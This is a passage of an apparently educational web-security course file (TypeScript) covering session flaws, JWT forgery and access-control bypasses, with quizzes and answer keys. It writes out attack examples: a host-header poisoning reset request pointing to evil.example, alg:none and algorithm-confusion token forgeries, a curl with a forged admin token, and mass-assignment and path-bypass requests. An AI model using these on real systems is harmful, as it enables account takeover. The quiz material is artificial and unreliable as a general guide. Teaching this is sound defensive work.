import type { Unit } from "../types";

const unit6: Unit = {
  id: "auth-access",
  index: 6,
  title: "Auth, Access & Logic Flaws",
  tagline: "The bugs that aren't in a scanner's wordlist.",
  tone: "offense",
  lessons: [
    {
      id: "broken-auth",
      title: "Broken authentication",
      summary: "How login and session systems are supposed to work, then everything that can go wrong between 'who are you' and 'session cookie'.",
      cards: [
        {
          kind: "objective",
          title: "What you'll be able to do",
          body: [
            "Explain what a session is, how a server knows two HTTP requests belong to the same logged-in user, and why that mechanism exists.",
            "Given a login flow or password-reset flow, identify which step is missing a security check and name the resulting weakness (enumeration, fixation, token prediction, rate-limit bypass).",
          ],
        },
        {
          kind: "intuition",
          title: "Why you need sessions at all",
          body: [
            "HTTP is stateless: the server treats every request as if it's from a stranger it has never met. There is no built-in 'memory' of who you are between one request and the next.",
            "Analogy: imagine a hotel where the receptionist forgets your face the instant you turn around. To get into your room ten minutes after checking in, you'd need to prove your identity again from scratch every single time — unless the hotel gives you a keycard after check-in.",
            "A session is that keycard. You authenticate once (prove identity with a password, usually), and the server hands you a token — normally stored in a cookie — that you present on every later request instead of re-proving who you are.",
            "Where the analogy breaks: a stolen keycard only works at one hotel; a stolen session cookie can be replayed by anyone, from anywhere, with no physical presence needed. That's why session tokens need to be unguessable and transmitted carefully.",
          ],
        },
        {
          kind: "prereq",
          title: "Cookies, headers, and 'who sent this request'",
          body: [
            "A cookie is a small piece of data the server tells the browser to store (`Set-Cookie: session=abc123`), and which the browser then automatically re-attaches to every later request to that same site (`Cookie: session=abc123`).",
            "The server keeps a lookup table (in memory, in a database, or encoded in the token itself) mapping session IDs to 'this is user u001, logged in at 10:02, role=user'. When a request arrives with `Cookie: session=abc123`, the server looks up abc123 and treats the request as coming from u001 — it does NOT re-check the password.",
            "This means the session token is, for as long as it's valid, equivalent to the password. Anyone who has it can act as that user. That single fact is the root of almost every bug in this lesson.",
          ],
          code: `Request 1 (login):
POST /login  {"user":"alice","pass":"hunter2"}
Response:    Set-Cookie: session=9f3a...

Request 2 (five minutes later, different page):
GET /account
Cookie: session=9f3a...
→ server looks up "9f3a..." in its session table, finds {user: alice}, serves alice's data.
No password was re-checked on Request 2.`,
          check: {
            type: "mc",
            q: "After a successful login, why doesn't the server ask for the password again on the next request?",
            options: [
              "HTTP automatically remembers the last authenticated user",
              "The browser re-sends the password invisibly on every request",
              "The server trusts the session token in the cookie as proof of identity, instead of re-checking the password",
              "Passwords are only needed once per day",
            ],
            answer: 2,
            why: [
              "HTTP itself has no memory of anything; statelessness is exactly the problem sessions solve.",
              "The password is not resent; only the session token is sent.",
              "",
              "The expiry has nothing to do with it; the mechanism is the token lookup, not a time-of-day rule.",
            ],
            explain: "Once logged in, the token (cookie) stands in for the password. The server trusts whoever presents a valid token — which is exactly why protecting that token matters so much.",
            hints: ["What does the browser automatically attach to every request to the same domain?", "Think about what the server actually checks on request #2 versus request #1."],
            ref: "Cookies, headers, and 'who sent this request'",
          },
        },
        {
          kind: "explain",
          title: "The properties a session token must have",
          body: [
            "High entropy: it must not be guessable. A sequential integer (session=1002) or a predictable pattern (timestamp + user id) lets an attacker enumerate valid tokens.",
            "Rotation on login: a NEW token should be issued every time a user authenticates, and any token issued before login should stop working after. Reusing a pre-login token is called session fixation — an attacker can set a victim's session ID before they log in, then use that same ID afterward.",
            "Server-side invalidation on logout: 'logging out' must delete the session server-side (so the token is rejected even if replayed), not just tell the browser to delete the cookie — the attacker's copy of that cookie would still work otherwise.",
            "Scoped rate limiting: the login endpoint should limit attempts per account (not only per IP), because an attacker can rotate source IPs or spoof the `X-Forwarded-For` header if the app blindly trusts it for rate-limit identity.",
          ],
          check: {
            type: "fill",
            q: "A site reuses the same session ID a visitor had before they logged in, as their post-login session ID. Name this weakness (two words).",
            answers: ["session fixation"],
            explain: "Session fixation: the attacker can plant a known session ID in the victim's browser (e.g. via a link containing ?sessionid=X), wait for them to log in, then use that same ID to ride their authenticated session.",
            hints: ["It's about 'fixing' a value before the real authentication happens.", "Starts with 'session'."],
            ref: "The properties a session token must have",
          },
        },
        {
          kind: "example",
          title: "Worked example: password-reset host-header poisoning",
          body: [
            "Setup: shop.example sends password-reset emails containing a link built from the request's Host header: `https://{Host}/reset?t=<token>`. This saves the developer from hardcoding the domain, but it trusts attacker-controlled input to build a security-sensitive URL.",
            "Step 1 — normal flow: a real user requests a reset, the server builds the link from the Host header the browser naturally sent (shop.example), and the email contains `https://shop.example/reset?t=abc123`.",
            "Step 2 — attack: the attacker submits the SAME reset request for the victim's email address, but sends it with the Host header set to evil.example (Host headers are just an HTTP field; anyone can set them on their own outgoing request).",
            "Step 3 — the server still identifies the victim's account from the email in the POST body, generates a real, valid token for them, and builds the link using the (poisoned) Host header: `https://evil.example/reset?t=abc123`.",
            "Step 4 — the victim receives a genuine-looking password-reset email from shop.example's mail system, clicks the link, and their browser sends the token to evil.example — the attacker's server — where it's logged.",
            "Step 5 — validation: the attacker now has the victim's valid, unused reset token and can submit it at the real `shop.example/reset?t=abc123` to set a new password and take over the account.",
            "Root cause: the server used client-supplied, unauthenticated input (Host header) to construct a value with security consequences (the URL a secret token is delivered to).",
          ],
          code: `POST /reset HTTP/1.1
Host: evil.example
Content-Type: application/x-www-form-urlencoded

email=victim@example.com

→ Server logic: resetLink = "https://" + request.Host + "/reset?t=" + token
→ Email sent to victim contains: https://evil.example/reset?t=abc123
→ Victim clicks → token lands in evil.example's access logs.`,
          tone: "offense",
        },
        {
          kind: "mistakes",
          title: "Common mistakes",
          body: [
            "Confusing authentication with authorisation: authentication proves WHO you are (login); authorisation decides WHAT you're allowed to do once identified. A bug in one doesn't imply a bug in the other — broken auth bugs are about proving/forging identity, not about the permission checks covered later in this unit.",
            "Assuming 'the cookie is marked HttpOnly, so it's safe' — HttpOnly only stops JavaScript from reading the cookie (mitigates some XSS theft); it does nothing against host-header poisoning, fixation, or a weak token generator.",
            "Assuming MFA removes all login risk — if the server sets ANY authenticated-feeling cookie (e.g. `partial_login=true`) before the second factor is verified, or if MFA is only enforced on the login page and not on every sensitive action, it can be walked around entirely.",
          ],
        },
        {
          kind: "practice",
          title: "Guided practice",
          body: [
            "A site's 'remember me' feature sets a cookie `remember=u1042` directly containing the plaintext user ID, with no signature and no expiry. Anyone who sends `Cookie: remember=u1050` is logged in as user 1050. What property from the explanation card is missing, and what's the minimal fix in one sentence?",
          ],
          check: {
            type: "fill",
            q: "What single security property (from the token requirements you just learned) is missing from `remember=u1042`?",
            answers: ["unguessable", "high entropy", "unpredictable", "not guessable", "randomness"],
            explain: "The token is just the predictable user ID with no secret, random component — anyone can forge a valid one by guessing another ID. The fix is to store a long, cryptographically random, server-side-verifiable token instead of an identifier value, and sign or look it up server-side rather than trusting it at face value.",
            hints: ["Could an attacker produce a working cookie for someone else just by changing a number?", "Compare this to the 'high entropy' requirement from the earlier explain card."],
            ref: "The properties a session token must have",
          },
        },
        {
          kind: "relevance",
          title: "What this proves — and doesn't",
          body: [
            "In authorised testing, demonstrating that you can forge, fixate, or replay another user's session token proves an authentication bypass with concrete impact (account takeover) — strong evidence for a report.",
            "It does NOT prove that other accounts are compromised, that data was exfiltrated, or that the bug is exploitable at scale, unless you demonstrate each of those within scope.",
            "Only test against systems and accounts you are explicitly authorised to test (your own lab accounts or a sanctioned bug-bounty target) — never attempt host-header poisoning or token guessing against real users without permission.",
          ],
        },
      ],
      exercises: [
        {
          type: "mc",
          q: "A password-reset email contains `https://{{Host}}/reset?t=<token>`. You change the Host header on your POST request to an attacker-controlled domain, and the victim's token later shows up in your server logs. What is the bug called?",
          options: ["Stored XSS", "Password-reset poisoning (host-header injection)", "CSRF", "SQL injection"],
          answer: 1,
          why: [
            "XSS involves injecting script that executes in a victim's browser; nothing here involves script execution.",
            "",
            "CSRF tricks a victim's browser into making an unwanted request using their existing session; here the attacker controls the URL the token is delivered to, not a forged request from the victim.",
            "No database query is involved.",
          ],
          explain: "The backend trusted the client-supplied Host header to build a security-sensitive URL. Supplying an attacker domain redirects the token's delivery to the attacker.",
          hints: ["Which card in the lesson walked through exactly this five-step attack?", "What is being poisoned: the database, the session, or the link that's generated?"],
          ref: "Worked example: password-reset host-header poisoning",
        },
        {
          type: "mc",
          q: "A login endpoint enforces 'max 5 attempts' using the client's `X-Forwarded-For` header as the identity key for its rate limiter. What's the problem?",
          options: [
            "X-Forwarded-For is encrypted so the limiter can't read it",
            "X-Forwarded-For is client-controlled, so an attacker can send a different value on each request and reset the counter",
            "There is no problem; this is the correct way to rate-limit",
            "X-Forwarded-For only works over HTTPS",
          ],
          answer: 1,
          why: [
            "Headers aren't encrypted at the application layer the server reads them from; that's not the issue anyway.",
            "",
            "It's a real and common misconfiguration — rate limiting on a value the client fully controls defeats the purpose.",
            "HTTP vs HTTPS has nothing to do with it.",
          ],
          explain: "X-Forwarded-For is just an HTTP header the client can set to anything. If the limiter keys on it instead of the server's own view of the connecting IP (or the account being targeted), the attacker rotates the header value to bypass the limit.",
          hints: ["Who normally sets this header: the server, a trusted proxy, or the client?", "Reread 'scoped rate limiting' in the explain card."],
          ref: "The properties a session token must have",
        },
        {
          type: "fill",
          q: "True 'sign out everywhere' must do what, beyond deleting the cookie in the current browser? (one short phrase)",
          answers: ["invalidate the session server-side", "invalidate all sessions server side", "revoke the session on the server", "delete the session server-side"],
          explain: "If the server doesn't invalidate the stored session record, an attacker who already copied the cookie (e.g. via a prior XSS or sniffed traffic) keeps a working session even after the legitimate user 'logs out'.",
          hints: ["Where does the real decision 'is this token still valid' get made — in the browser or on the server?", "Deleting a browser cookie only affects that one browser."],
          ref: "The properties a session token must have",
        },
        {
          type: "order",
          q: "Put these steps of a session-fixation attack in order.",
          items: [
            "Attacker obtains or chooses a session ID and gets it set in the victim's browser (e.g. via a crafted link)",
            "Victim logs into the real site; the server keeps using the same session ID instead of issuing a new one",
            "Attacker uses the same session ID in their own requests",
            "Attacker's requests are now treated as the logged-in victim",
          ],
          explain: "Fixation works because the session ID never changes across the authentication boundary — the attacker 'fixes' it in advance and it becomes valid the moment the victim logs in.",
          hints: ["The attacker's first move happens before login, not after.", "The key failure is the server not rotating the ID at login."],
          ref: "The properties a session token must have",
        },
        {
          type: "mc",
          q: "Which pair correctly distinguishes authentication from authorisation?",
          options: [
            "Authentication = proving who you are; authorisation = deciding what you're allowed to do",
            "Authentication = deciding what you're allowed to do; authorisation = proving who you are",
            "They are two names for the same check",
            "Authentication only applies to admins; authorisation only applies to regular users",
          ],
          answer: 0,
          why: [
            "",
            "This reverses the definitions.",
            "They are distinct checks and can fail independently, as the mistakes card explained.",
            "Both apply to every user regardless of role.",
          ],
          explain: "Authentication answers 'who are you' (login); authorisation answers 'what are you allowed to do, given who you are' (covered in the access-control lesson). A system can authenticate correctly but still authorise incorrectly, or vice versa.",
          hints: ["Reread the 'common mistakes' card.", "Think about which one happens first in a request's life (identify, then decide permission)."],
          ref: "Common mistakes",
        },
      ],
    },
    {
      id: "jwt",
      title: "JWTs: a token format, not a security guarantee",
      summary: "How JSON Web Tokens are meant to work as self-contained, signed session claims — then the classic ways that signature gets bypassed.",
      cards: [
        {
          kind: "objective",
          title: "What you'll be able to do",
          body: [
            "Explain what a JWT is, what its three parts contain, and why the signature — not the payload content — is what makes it trustworthy.",
            "Given a JWT and a server's verification behaviour, identify whether `alg:none`, algorithm confusion, or neither applies, and explain why.",
          ],
        },
        {
          kind: "intuition",
          title: "Why JWTs exist",
          body: [
            "The previous lesson's session model requires the server to keep a lookup table of every active session (a 'stateful' session). That's fine for a single server, but awkward across many microservices or servers that don't share a database.",
            "A JWT (JSON Web Token) is a way to make a session 'stateless': instead of storing {token -> user info} server-side, the server packs the user info directly INTO the token and cryptographically signs it. Anyone holding the token can read the claims, but only the server (which holds the secret key) can produce a signature that will be accepted as valid.",
            "Analogy: it's like a wax-sealed letter stating 'this person is a VIP member' — anyone can read the letter, but only the original sealer's wax stamp proves it wasn't altered. If you can forge the seal, you can write anything you want on the letter.",
            "Where the analogy breaks: digital signatures aren't inherently un-forgeable the way a unique wax stamp might be — they depend entirely on the verifier correctly checking the right algorithm with the right key, which is exactly where implementations go wrong.",
          ],
        },
        {
          kind: "prereq",
          title: "Base64 encoding vs encryption (they are not the same)",
          body: [
            "Base64 is a reversible ENCODING, not encryption — it converts bytes into a text-safe alphabet so they can travel inside a URL or header. Anyone can decode base64 instantly with no key; it provides zero confidentiality.",
            "A JWT's header and payload are base64url-encoded JSON, meaning anyone who intercepts or is handed a JWT can read every claim inside it in plain text. Never put secrets (passwords, raw card numbers) in a JWT payload.",
            "What DOES protect a JWT from tampering is the third part: a cryptographic signature computed over the header+payload using a secret the server controls. Changing even one character of the payload should make the signature invalid — IF the server checks it correctly.",
          ],
          check: {
            type: "mc",
            q: "You intercept a JWT and base64-decode the payload to read `{\"role\":\"user\"}`. What does this tell you?",
            options: [
              "The token is broken, because payloads shouldn't be readable",
              "Nothing unusual — JWT payloads are always readable; the security relies on the signature catching tampering, not the payload being secret",
              "The site has leaked an encryption key",
              "The token has already expired",
            ],
            answer: 1,
            why: [
              "This is completely normal JWT design, not a bug by itself.",
              "",
              "No key is involved in base64, so none has been leaked.",
              "Readability has nothing to do with the `exp` claim.",
            ],
            explain: "JWT payloads are meant to be readable. Confidentiality isn't the design goal — integrity (tamper-evidence via signature) is. The bug only exists if you can then CHANGE the payload and still get it accepted.",
            hints: ["Reread the distinction between encoding and encryption.", "What is the signature there to prevent?"],
            ref: "Base64 encoding vs encryption (they are not the same)",
          },
        },
        {
          kind: "explain",
          title: "Structure and the two classic signature-verification bugs",
          body: [
            "A JWT is `base64url(header).base64url(payload).signature`. The header names the signing algorithm (e.g. HS256 = HMAC-SHA256 with a shared secret; RS256 = RSA signature with a private/public keypair). The payload holds claims such as `sub` (subject/user id), `role`, and `exp` (expiry timestamp).",
            "Bug 1 — `alg:none`: the JWT spec technically allows an algorithm value of 'none', meaning 'this token is unsigned'. A verifier that doesn't explicitly reject 'none' will accept a token with an empty signature, letting an attacker edit any claim (like role) freely.",
            "Bug 2 — algorithm confusion (RS256 → HS256): with RS256, the server signs with a PRIVATE key and verifies with a PUBLIC key — the public key is often openly served (e.g. at /.well-known/jwks.json) because it's meant to be shared. If the server's verification code picks its algorithm from the attacker-supplied header instead of a fixed, expected algorithm, an attacker can set `alg:HS256` and sign the token using the known PUBLIC key as an HMAC secret. A naive verifier does `HMAC-verify(publicKey, token)`, which matches — the server has now been tricked into treating its own public key as a shared secret.",
            "Both bugs share one root cause: the server lets the TOKEN tell it which algorithm (or whether any signature at all) to use for verification, instead of hardcoding the expected algorithm and key in server-side configuration.",
          ],
          code: `# alg:none bypass
header  = {"alg":"none","typ":"JWT"}
payload = {"sub":"1001","role":"admin","exp":9999999999}
token   = base64url(header) + "." + base64url(payload) + "."   ← empty signature
# server config required to reject this: explicitly disallow alg "none"

# alg confusion (RS256 → HS256)
pubkey = fetched from https://api.example.com/.well-known/jwks.json  (meant to be public)
token  = base64url({"alg":"HS256",...}) + "." + base64url(payload)
sig    = HMAC-SHA256(key = pubkey_bytes, data = header + "." + payload)
# server does HMAC-verify(pubkey, token) because it trusted the header's alg → matches → accepted`,
          tone: "offense",
        },
        {
          kind: "example",
          title: "Worked example: decoding and testing a real-looking token",
          body: [
            "You receive this cookie from a logged-in-as-regular-user session: `eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMDAxIiwicm9sZSI6InVzZXIiLCJleHAiOjE3MzN9.XlPZC2sig`.",
            "Step 1: split on the two dots → header part, payload part, signature part.",
            "Step 2: base64url-decode the header: `{\"alg\":\"HS256\"}`. This tells you the server expects HMAC-SHA256 — a SYMMETRIC algorithm (one shared secret used for both signing and verifying, unlike RS256's two different keys). Symmetric means algorithm confusion via a public key won't apply here — that attack needs the server to misuse an RS256 public key. For HS256-only tokens, your first thing to try is `alg:none`.",
            "Step 3: base64url-decode the payload: `{\"sub\":\"1001\",\"role\":\"user\",\"exp\":1733...}`. The `role` claim is the one worth changing if you can bypass the signature.",
            "Step 4: try the `alg:none` bypass: construct `{\"alg\":\"none\"}`.`{\"sub\":\"1001\",\"role\":\"admin\",\"exp\":9999999999}`. with an empty third segment, and send it as the session cookie.",
            "Step 5: validate — if the server responds with admin-only content (not a 401/403), the bypass worked, confirming the server's JWT library accepts unsigned tokens. If it rejects the token, the library correctly validates the algorithm, and this particular attack path is closed (doesn't mean no other bug exists).",
          ],
          code: `curl -b 'token=eyJhbGciOiJub25lIn0.eyJzdWIiOiIxMDAxIiwicm9sZSI6ImFkbWluIn0.' https://shop.example/app/admin
→ HTTP/1.1 200 OK   (vulnerable: unsigned token accepted)
   -- or --
→ HTTP/1.1 401 Unauthorized   (not vulnerable to this specific bypass)`,
        },
        {
          kind: "mistakes",
          title: "Common mistakes",
          body: [
            "Assuming any JWT can be forged with `alg:none` — this only works if the server's verification library is misconfigured to allow it; modern, correctly-configured libraries reject it by default.",
            "Assuming algorithm confusion works on any JWT — it specifically requires the server to support RS256 verification where the key is derivable/public AND to trust the token's own `alg` header when choosing how to verify. An HS256-only deployment with no public key exposed isn't vulnerable to this particular technique.",
            "Treating 'I can read the payload' as a vulnerability on its own — readability is by design; the vulnerability (if any) is in whether you can modify the payload and still pass verification.",
          ],
        },
        {
          kind: "practice",
          title: "Guided practice",
          body: [
            "A token's header decodes to `{\"alg\":\"RS256\",\"typ\":\"JWT\"}`, and the application exposes its RSA public key at `/.well-known/jwks.json`. The server's verification code is: `verify(token, key, algorithm = token.header.alg)`. Is this configuration likely exploitable, and by which of the two bugs covered?",
          ],
          check: {
            type: "mc",
            q: "Which bug applies to a server that picks its verification algorithm from `token.header.alg`, uses RS256, and publishes its public key?",
            options: [
              "alg:none, because the server allows any algorithm the token names",
              "Algorithm confusion (RS256→HS256), because the server will verify using whatever algorithm the token claims, and the public key can be reused as an HMAC secret",
              "Neither — publishing a public key for RS256 is always safe",
              "SQL injection, because the key is fetched dynamically",
            ],
            answer: 1,
            why: [
              "`alg:none` is a different, separate misconfiguration — it would require the library to accept an unsigned token specifically, which isn't what's described here.",
              "",
              "Publishing the public key is normal and necessary for RS256 — the danger only appears because the server also trusts the attacker-supplied `alg` field.",
              "No database query is involved in JWT verification.",
            ],
            explain: "Letting the token dictate the verification algorithm is the root cause of confusion attacks: the attacker switches the stated algorithm to HS256 and signs with the (public, known) RSA public key as if it were an HMAC secret, and the misconfigured verifier accepts it.",
            hints: ["Which of the two bugs from the explain card depends on a published key?", "The key detail is 'algorithm = token.header.alg' — who controls that value?"],
            ref: "Structure and the two classic signature-verification bugs",
          },
        },
        {
          kind: "relevance",
          title: "What this proves — and doesn't",
          body: [
            "Successfully forging a token that's accepted with an elevated role proves a real authentication/authorisation bypass with clear, reproducible impact — document the exact header/payload/request used.",
            "It does NOT prove every JWT-based app is broken this way — most modern JWT libraries reject `alg:none` and pin the expected algorithm by default. Always TEST, don't assume, on systems you're authorised to test.",
            "Decoding a JWT you were legitimately issued (e.g. your own test account's token) is not an attack; forging or tampering with tokens to access another user's data or elevated privileges without authorisation is, and must stay inside an approved scope or lab.",
          ],
        },
      ],
      exercises: [
        {
          type: "mc",
          q: "A JWT's header decodes to `{\"alg\":\"HS256\"}` and the app does NOT expose any RSA public key anywhere. Which of the two classic bugs from this lesson could still realistically apply?",
          options: ["Algorithm confusion (RS256→HS256), since HS256 is already in use", "alg:none, if the server's library fails to reject an unsigned token", "Both are equally likely", "Neither; HS256 tokens are always safe"],
          answer: 1,
          why: [
            "Algorithm confusion specifically needs a public RSA key available to be reused as an HMAC secret; there isn't one here.",
            "",
            "Confusion doesn't apply without a public key to abuse.",
            "HS256 is a legitimate algorithm but its safety depends entirely on implementation, not the algorithm name alone.",
          ],
          explain: "With no exposed public key, the RS256→HS256 confusion path has nothing to exploit. The remaining classic bug to try is alg:none, which doesn't depend on any published key.",
          hints: ["Which bug from the explain card needs a public key to work?", "Re-read the worked example's Step 2 reasoning about HS256-only tokens."],
          ref: "Worked example: decoding and testing a real-looking token",
        },
        {
          type: "fill",
          q: "What is being encoded (not encrypted) when you see the dot-separated base64 segments of a JWT?",
          answers: ["header and payload", "the header and payload", "json", "header, payload"],
          explain: "The header and payload are base64url-encoded JSON — readable by anyone, not secret. Only the signature segment provides tamper-detection, and only if the verifier checks it with a fixed, expected algorithm and key.",
          hints: ["Which two of the three dot-separated parts are plain encoded JSON?", "The third part is special — think about what it's for."],
          ref: "Base64 encoding vs encryption (they are not the same)",
        },
        {
          type: "mc",
          q: "You forge a token with `alg:none` and an empty signature, change `role` to `admin`, and the server returns admin content. What does this demonstrate?",
          options: [
            "The server's token library failed to reject unsigned tokens, allowing unauthenticated claim tampering",
            "The admin role was always publicly accessible",
            "The RSA private key was leaked",
            "The HMAC secret was guessed by brute force",
          ],
          answer: 0,
          why: [
            "",
            "If the endpoint required a valid session before your forged token, the forgery — not open access — is what granted entry.",
            "No RSA keys are involved in an alg:none bypass.",
            "No brute forcing occurred; the signature was simply empty and still accepted.",
          ],
          explain: "Accepting a token with alg:none means the server skipped signature verification entirely, so any claim (including role) is attacker-controlled with no cryptographic check at all.",
          hints: ["What did you actually have to know or guess to perform this forgery — any secret?", "Compare to the alg confusion bug, which needs a key; this one needs none."],
          ref: "Structure and the two classic signature-verification bugs",
        },
        {
          type: "order",
          q: "Put the steps of decoding and testing a suspicious JWT in the correct order.",
          items: [
            "Split the token on its two dots into header, payload, signature",
            "Base64url-decode the header to see the stated algorithm",
            "Base64url-decode the payload to see the claims (e.g. role)",
            "Attempt a signature bypass appropriate to the stated algorithm (alg:none, or confusion if a public key is exposed)",
            "Send the modified token and observe whether the server grants elevated access",
          ],
          explain: "You must know the algorithm before choosing which bypass to attempt, and you must inspect the claims before knowing what's worth changing.",
          hints: ["Which step tells you WHICH bug is even applicable?", "Validation (sending the tampered token) always comes last."],
          ref: "Worked example: decoding and testing a real-looking token",
        },
      ],
    },
    {
      id: "access-control",
      title: "Access control: the model, then its bypasses",
      summary: "How permission checks are supposed to work for every resource and action — then the many ways real implementations skip them.",
      cards: [
        {
          kind: "objective",
          title: "What you'll be able to do",
          body: [
            "Explain object ownership and role-based permission checks, and why EVERY request that reads or changes data needs its own check, not just the page that links to it.",
            "Given a 403 response and a variation on the request (method, path, headers), identify which access-control bypass technique is being attempted and why it might work.",
          ],
        },
        {
          kind: "intuition",
          title: "Why access control is a separate layer from login",
          body: [
            "Authentication (lesson 1) answers 'who is this?'. Access control answers a DIFFERENT question for every single action: 'is THIS identified user allowed to do THIS specific thing, to THIS specific piece of data?'.",
            "Analogy: being a hotel guest (authenticated) doesn't mean you can enter every room. The hotel must check, for every door, whether your particular keycard (your identity + role) opens THAT particular room (the object) — not just whether you're a guest at all.",
            "The place this breaks in real applications: developers often protect the easy case (hide the 'admin' link from the menu, or block the exact /admin URL) but forget to check permission again at the point where data is actually read or modified — e.g. the API endpoint the admin page calls. Hiding a link is not a permission check.",
          ],
        },
        {
          kind: "prereq",
          title: "Object ownership and roles, concretely",
          body: [
            "Object ownership: most data belongs to a specific user or account (e.g. order #4471 belongs to user u203). A correct check looks like: `if (order.owner_id !== current_user.id) deny`. This must run on every single request that touches that order — view, edit, delete, refund — using the ID the SERVER authenticated, never an ID the client merely claims.",
            "Roles / permissions: separate from ownership, some actions are restricted by role regardless of ownership (e.g. only users with role=admin can view ANY user's data, or delete products). A correct check looks like: `if (current_user.role !== 'admin') deny`.",
            "The critical rule for both: the check must be enforced on the SERVER, on every request, based on server-held identity (the session/token from lesson 1) — never based on a value the client sends in the URL, body, or a hidden form field, and never satisfied merely because a UI button was hidden.",
          ],
          check: {
            type: "mc",
            q: "An app hides the 'Delete User' button for non-admins in the UI, but the `/api/users/:id` DELETE endpoint itself doesn't check the caller's role. What's wrong?",
            options: [
              "Nothing — hiding the button is sufficient since users can't see it",
              "The permission check exists only in the UI, not on the server, so anyone who sends the raw DELETE request directly bypasses it entirely",
              "This is a CSRF vulnerability, not an access control one",
              "DELETE requests are always safe by HTTP convention",
            ],
            answer: 1,
            why: [
              "A hidden button is not a security control; the server must independently refuse the action.",
              "",
              "CSRF is a different issue — about a victim's browser making an unintended request, not about missing role checks.",
              "HTTP method names carry no inherent security guarantee.",
            ],
            explain: "UI hiding is a usability feature, not an access-control mechanism. Anyone can craft the underlying HTTP request directly (with curl, Burp, etc.), bypassing any UI entirely — the server must independently enforce the rule.",
            hints: ["Where must a permission check actually run to be trustworthy: client or server?", "What happens if someone skips the UI and talks to the API directly?"],
            ref: "Object ownership and roles, concretely",
          },
        },
        {
          kind: "explain",
          title: "How real checks get skipped: the common failure patterns",
          body: [
            "Inconsistent enforcement across methods/paths: a developer adds the ownership check to the GET handler but forgets the same resource's PUT/DELETE handler, or the exact-string path `/admin` is blocked while `/admin/` or `/Admin` routes to the same code without the same check (normalization differences between a WAF/proxy and the application).",
            "Trusting client-supplied headers for identity or origin: `X-Forwarded-For: 127.0.0.1` or `X-Original-URL: /admin` can trick a proxy/app combination where one component makes a decision based on a header the CLIENT, not a trusted upstream, supplied.",
            "Mass assignment: when a server blindly maps an entire incoming JSON body onto an internal data model (e.g. `model.update(request.body)`), any field the attacker adds — even ones the UI never exposed, like `role` or `credits` — gets written, because there's no allow-list restricting which fields a given caller may set.",
            "Business-logic rules with no server-side state tracking: 'one discount code per account' or 'can't refund twice' is a RULE about a sequence of actions over time, not a single request's permission — these need the server to track state (has this code been used by this account already?) and enforce it atomically, not just validate the shape of one request in isolation.",
          ],
          code: `# Mass assignment: UI only shows a "name" field, but the API accepts more
PATCH /api/profile
{ "name": "alice", "role": "admin" }
→ if backend does model.update(req.body) with no allow-list, role is silently changed

# Business logic: reusing a one-time discount
POST /cart/apply-discount { "code": "WELCOME10" }   ← used once, server marks it used
POST /cart/apply-discount { "code": "WELCOME10" }   ← should be rejected if marking works
→ if the "already used" flag isn't checked-and-set atomically, a bug (or a race, next lesson) lets it apply twice.`,
          tone: "offense",
        },
        {
          kind: "example",
          title: "Worked example: tracing a 403 to its bypass",
          body: [
            "You're a logged-in regular user. `GET /admin` returns `403 Forbidden`. Your goal: determine WHY it's 403'd (which component decided that) before trying bypasses blindly.",
            "Step 1 — check if it's a path-matching issue: try `GET /admin/` (trailing slash), `/Admin` (case), `/admin/.`, `/admin%20`. Reasoning: many reverse proxies/WAFs block an EXACT string match, while the backend's router treats the slightly-different path as equivalent to /admin and serves it anyway — two components disagree about 'is this the same resource'.",
            "Step 2 — result: `GET /admin/` returns `200 OK` with the admin dashboard. This confirms the WAF rule matched only the literal string `/admin` (no trailing slash), while the app's own routing normalizes `/admin/` to the same handler — the real access-control check (if one exists at all in the handler) is what you'd need to test next, separately.",
            "Step 3 — why this is still meaningful: you haven't yet proven the handler itself lacks a role check — you've proven the WAF's blocking rule can be routed around. The vulnerability you can CLAIM depends on what you observe next: if the dashboard shows real admin data, the handler ALSO has no role check (full bypass); if it immediately redirects to login or shows a generic page, the WAF bypass alone isn't exploitable.",
            "Step 4 — in this example, the dashboard loads with real user data and admin controls, confirming both: (a) the WAF only pattern-matched the exact path, and (b) the handler behind it never independently verified the caller's role.",
          ],
          code: `GET /admin HTTP/1.1          → 403 Forbidden        (blocked by WAF prefix match)
GET /admin/ HTTP/1.1         → 200 OK, <h1>Admin</h1>, real user list visible
  (confirms: WAF rule was string-exact; handler itself has no independent role check)`,
          tone: "offense",
        },
        {
          kind: "mistakes",
          title: "Common mistakes",
          body: [
            "Assuming a 403 on one path means the resource is fully protected — a single blocking rule (often in a proxy/WAF) is not the same as a check enforced in the application logic itself.",
            "Assuming finding a working bypass path automatically proves a critical vulnerability — you must also show the underlying handler actually returns sensitive data or performs a privileged action, not just that it returns 200.",
            "Treating mass assignment and ownership (BOLA/IDOR) bugs as the same thing — mass assignment is about WHICH FIELDS you can set; ownership bugs are about WHOSE OBJECT (by ID) you can act on. A request can suffer from either, both, or neither.",
          ],
        },
        {
          kind: "practice",
          title: "Guided practice",
          body: [
            "An API endpoint `GET /api/orders/{id}` returns order details for the given id, with no check that `{id}` belongs to the requesting user. You're logged in as user u203, whose own order is #4471. What should you try, and what would confirm the bug?",
          ],
          check: {
            type: "fill",
            q: "What would you change in the request to test for this specific access-control bug, assuming you only know your own order id (4471)?",
            answers: ["the id", "change the order id", "try a different order id", "increment or change the id in the url", "request a different id such as 4472"],
            explain: "Since there's no ownership check mentioned, try requesting a neighbouring or arbitrary order id (e.g. 4472) while authenticated as u203. If the server returns another user's order data, that confirms a broken object-level authorization bug (sometimes called IDOR/BOLA) — the server identified a resource purely from the URL, without checking it belongs to the caller.",
            hints: ["Reread 'object ownership' — what check is supposedly missing here?", "You have one object ID you trust (4471). What's the simplest neighbouring value to try?"],
            ref: "Object ownership and roles, concretely",
          },
        },
        {
          kind: "relevance",
          title: "What this proves — and doesn't",
          body: [
            "Demonstrating that you (an authenticated low-privilege account) can read or modify another account's data, or reach an admin-only function, is strong, concrete evidence of an access-control vulnerability with real impact — show the exact request and response.",
            "A 200 response alone does not prove sensitive access — confirm the response body actually contains protected data or performs a real privileged action, not a generic or empty page.",
            "Only test ownership bypasses against accounts/objects you control or are explicitly authorised to target (e.g. two test accounts you created in a lab or bug-bounty program) — accessing a stranger's real account data without authorisation is not an acceptable way to 'prove' the bug.",
          ],
        },
      ],
      exercises: [
        {
          type: "mc",
          q: "`/admin` returns 403 but `/admin/` returns 200 with real admin content. What does this demonstrate, precisely?",
          options: [
            "The site has no vulnerabilities, this is normal redirect behaviour",
            "A blocking rule (likely in a WAF/proxy) matched the literal path string, while the application's own router treats the trailing-slash variant as the same resource with no independent check",
            "The admin panel uses a different authentication system",
            "This is a caching bug unrelated to security",
          ],
          answer: 1,
          why: [
            "A real, exploitable content difference between two near-identical paths is not normal, safe behaviour.",
            "",
